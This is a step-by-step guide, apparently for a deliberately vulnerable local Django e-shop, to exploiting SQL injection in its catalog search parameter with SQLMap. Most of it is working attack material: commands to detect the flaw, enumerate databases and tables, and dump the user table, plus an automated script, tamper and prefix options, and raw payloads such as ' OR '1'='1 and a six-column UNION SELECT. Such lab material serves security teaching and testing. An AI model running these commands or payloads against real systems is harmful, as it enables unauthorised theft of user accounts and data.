# SQLMap Testing Guide for E-Shop SQL Injection

## Prerequisites
1. Install SQLMap: `sudo apt-get install sqlmap` (Linux) or download from https://sqlmap.org/
2. Make sure the Django server is running: `python manage.py runserver`
3. You need to be logged in to access the catalog page

## Step 1: Get Session Cookie
First, login to the application and get your session cookie:

1. Open browser and go to http://127.0.0.1:8000/login/
2. Login with credentials (e.g., admin/admin123 or test/test123)
3. Open Developer Tools (F12) → Application/Storage → Cookies
4. Copy the `sessionid` cookie value

## Step 2: Basic SQLMap Test

```bash
# Basic detection with session cookie
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch \
       --risk=3 \
       --level=5
```

## Step 3: Enumerate Databases

```bash
# List all databases
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch \
       --dbs
```

## Step 4: Enumerate Tables

```bash
# List tables in current database
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch \
       --tables
```

## Step 5: Dump User Data

```bash
# Dump the user table
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch \
       -T eshop_customuser \
       --dump
```

## Step 6: Advanced Options

```bash
# Full exploitation with all techniques
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch \
       --risk=3 \
       --level=5 \
       --threads=10 \
       --technique=BEUQ \
       --dbms=SQLite \
       --tamper=space2comment \
       -v 3
```

## Technique Flags Explained
- `B` = Boolean-based blind
- `E` = Error-based
- `U` = Union query-based
- `Q` = Inline queries

## Common SQLMap Options for This Vulnerability

```bash
# Specify the vulnerable parameter explicitly
sqlmap -u "http://127.0.0.1:8000/" \
       -p "q" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --batch

# Use specific payload prefix/suffix for LIKE clause
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --prefix="%'" \
       --suffix="OR '%'='" \
       --batch

# Force UNION technique with specific column count
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID_HERE" \
       --technique=U \
       --union-cols=6 \
       --batch
```

## Automated Script

Create a file `sqlmap_test.sh`:

```bash
#!/bin/bash
# Replace with your actual session ID
SESSION_ID="YOUR_SESSION_ID_HERE"
TARGET_URL="http://127.0.0.1:8000/?q=test"

echo "=== SQLMap Automated Test ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Basic detection
echo "[*] Testing for SQL injection..."
sqlmap -u "$TARGET_URL" --cookie="sessionid=$SESSION_ID" --batch --smart

# Test 2: Get database info
echo "[*] Getting database information..."
sqlmap -u "$TARGET_URL" --cookie="sessionid=$SESSION_ID" --batch --current-db --current-user

# Test 3: Enumerate tables
echo "[*] Enumerating tables..."
sqlmap -u "$TARGET_URL" --cookie="sessionid=$SESSION_ID" --batch --tables

# Test 4: Dump interesting tables
echo "[*] Attempting to dump user table..."
sqlmap -u "$TARGET_URL" --cookie="sessionid=$SESSION_ID" --batch -T eshop_customuser --dump

echo "[*] Testing complete!"
```

## Expected Output
When SQLMap successfully detects the vulnerability, you should see:
```
[*] the back-end DBMS is SQLite
[*] fetched data logged to text files under '/home/user/.sqlmap/output/127.0.0.1'

Parameter: q (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: q=' OR '1'='1

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: q=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
```

## Troubleshooting

### If SQLMap doesn't find the vulnerability:
1. Make sure you're using a valid session cookie
2. Try increasing risk and level: `--risk=3 --level=5`
3. Specify the DBMS: `--dbms=SQLite`
4. Use verbose mode to see what's happening: `-v 3`

### If you get authentication errors:
1. Your session may have expired - login again and get a new sessionid
2. Try adding CSRF token: `--csrf-token=csrftoken`

### For the specific LIKE clause issue:
Since the query uses `LIKE '%%input%%'`, you might need:
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=$SESSION_ID" \
       --prefix="%'" \
       --suffix="--" \
       --tamper=space2comment \
       --batch
```

## Manual Verification
Before running SQLMap, verify the vulnerability manually:
1. Login to the application
2. Go to catalog page
3. In search box, enter: `' OR '1'='1`
4. If you see all products, the injection works

Then SQLMap should be able to exploit it automatically.